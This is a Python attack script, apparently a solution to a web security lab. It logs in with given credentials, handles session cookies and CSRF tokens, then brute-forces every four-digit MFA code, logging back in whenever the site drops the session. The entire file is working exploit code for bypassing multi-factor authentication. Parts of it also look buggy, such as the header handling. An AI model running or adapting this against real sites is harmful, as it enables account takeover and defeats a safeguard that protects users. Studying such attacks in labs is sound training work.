#!/usr/bin/env python3

import helper
import ast
import itertools
import signal
import string
import sys
import json
import requests
from bs4 import BeautifulSoup
from copy import deepcopy

# Note: Code should extract Set-Cookie cookies on GET responses and save them as session objects to be injected into subsequent requests.
# Note 2: Requests module does the above if you use a Requests.Session object

# process:
# 1. GET(host)
# 1. RESP extract Set-Cookie: session
# 2. GET(host/login, cookies='{"session": "session"}')
# 2. RESP body extract => csrf value
# 3. POST(host/login, cookies='{"session": "session"} body=csrf & username & password)
# 3. RESP status_code=302 extract cookie 'Set-Cookie = session', header Location (should = login2)
# 4. GET(host/login2, cookies='{"session": "session"}')
# 4. RESP status_code = 200 body extract => csrf value
# 5. POST(host/login2, cookies='{"session": "session"}') body csrf & mfa-code
# 5. RESP status_code = 200 extract body "Please enter your 4-digit security code"
# 6. redo 5
# 6. RESP status_code = 200 extract header Set-Cookie = session, extract body "login-form" & csrf
# 7. LOOP TO step 3

extract_host = lambda session : json.loads(session.headers)['Host']

def interrupt_handler(signum, frame):
    print(f'Handling signal {signum} ({signal.Signals(signum).name}).')

    sys.exit(0)

def prepare_headers(host, referer):
    headers = {'Host': host, 'Referer': referer}
    return json.dumps(headers)


def extract_csrf(resp_body):
    csrf = None
    soup = BeautifulSoup(resp_body, 'html.parser')
    for input in soup.body.find_all('input'):
        if input.get('name') == 'csrf':
            csrf = input.get('value')
            break
    
    return csrf

def find_html_attribute(html, element, value):
    found = False
    soup = BeautifulSoup(html, 'html.parser')
    for e in soup.body.find_all(element):
        if e.text == value:
            found = True
            break
    
    return found


def establish_login_session(host, headers):
    '''
    login to service with login url
    return {status_code, session_token}
    '''
    # Obtain session token for login
    session = requests.Session()
    session.headers = headers
    resp = session.get(host)
    if resp.status_code != 200:
        raise Exception("ERROR: GET host response {}".format(resp.status_code))
    
    # obtain CSRF token for login request
    url = "{}/login".format(host)
    resp = session.get(url)
    if resp.status_code != 200:
        raise Exception("ERROR: GET /login response {}".format(resp.status_code)) 
    
    csrf = extract_csrf(resp.content)
    if not csrf:
        raise Exception('ERROR: failed to extract CSRF token from /login response') 
    
    return session, csrf


def authn_credentials(session, headers, csrf, credentials):
    '''
    login to service with login url
    return {status_code, session_token}
    '''
    # login using API with session token and passing CSRF token in body
    # this will authenticate using credentials and auto redirect to mfa request (login2)
    host = extract_host(session)
    return session.post(url="{}/login".format(host),
                        headers={'Referer': "{}/login".format(host), "Content-Type": "application/x-www-form-urlencoded", "Content-Length": "70", "Origin": "host"},
                        data="csrf={}&username={}&password={}".format(csrf, credentials['username'], credentials['password']))


def authn_mfa(session, headers, csrf, mfa_token):
    host = extract_host(session)
    return session.post(url="{}/login2".format(host),
                        headers=headers,
                        data="csrf={}&mfa-code={}".format(csrf, mfa_token))


def brute_force_mfa(session, csrf, credentials, digits=4):
    host = extract_host(session)
    digits = list(range(0, 10))
    resp = None

    for permutation in itertools.product(digits, repeat=4):
        permutation_list = [str(digit) for digit in permutation]
        mfa_code = "".join(permutation_list)

        if not resp or find_html_attribute(resp.content, 'label', 'Please enter your 4-digit security code'):
            print(mfa_code)
            resp = authn_mfa(session, {'Referer': "{}/login2".format(host)}, csrf, mfa_code)
        elif find_html_attribute(resp.content, 'h1', 'Login'):
            resp = authn_credentials(session, {'Referer': "{}/login2".format(host)}, csrf, credentials)
        else:
            raise Exception(f"ERROR: unexpected response - unable to continue - mfa_code {mfa_code}")

        if resp.status_code != 200:
            raise Exception(f"ERROR: POST returned {resp.status_code} status - mfa_code {mfa_code}")
        
        csrf = extract_csrf(resp.content)
        if not csrf:
            raise Exception(f"ERROR: failed to extract CSRF token from /login response - mfa_code: {mfa_code}")
        


if __name__ == "__main__":
    signal.signal(signal.SIGINT, interrupt_handler)
    args = helper.args()

    if args.verbose:
        print(f"host: {args.host} verbose: {args.verbose}")
        print(f"login api: {args.login} username: {args.username} password: {args.password}")

    session, csrf = establish_login_session(args.host,
                                            helper.prepare_headers(prepare_headers(args.host, args.host)))
    resp = authn_credentials(session, headers={'Referer': "{}/login".format(args.host)}, csrf=csrf, credentials={'username': args.username, 'password': args.password})
    if resp.status_code != 200:
        raise Exception("ERROR: failed to login using credentials")
    
    print("Successfully logged in using credentials")

    csrf = extract_csrf(resp.content)
    if not csrf:
        raise Exception('ERROR: failed to extract CSRF token from /login2 response')
    
    brute_force_mfa(session, csrf, credentials={'username': args.username, 'password': args.password})


